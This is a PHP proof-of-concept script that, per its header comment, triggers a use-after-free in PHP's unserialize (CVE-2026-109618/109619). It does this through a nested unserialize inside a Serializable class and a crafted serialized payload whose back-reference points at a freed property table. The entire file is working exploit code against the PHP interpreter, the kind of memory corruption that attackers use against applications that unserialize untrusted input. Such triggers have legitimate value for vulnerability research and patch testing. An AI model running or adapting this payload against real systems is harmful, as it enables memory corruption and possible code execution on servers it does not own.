<?php
// CVE-2026-109618/109619 minimal UAF trigger (zend_user_unserialize missing BG(serialize_lock)++)
class CachedData implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void {
        $o = unserialize($data);   // nested unserialize: reuses OUTER var_hash (missing lock)
        $o->x = 0;                 // 9th dynamic prop -> property table 8->16 realloc, old arData freed
    }
}
$n = (int)($argv[1] ?? 4);
$inner = 'O:8:"stdClass":8:{';
for ($i = 0; $i < 8; $i++) {
    $inner .= 's:1:"' . chr(97 + $i) . '";i:' . ($i + 100) . ';';
}
$inner .= '}';
$outer = 'a:2:{i:0;C:10:"CachedData":' . strlen($inner) . ':{' . $inner . '}i:1;R:' . $n . ';}';
echo "payload R:$n\n";
$r = unserialize($outer);
var_dump($r[1]);
echo "survived\n";
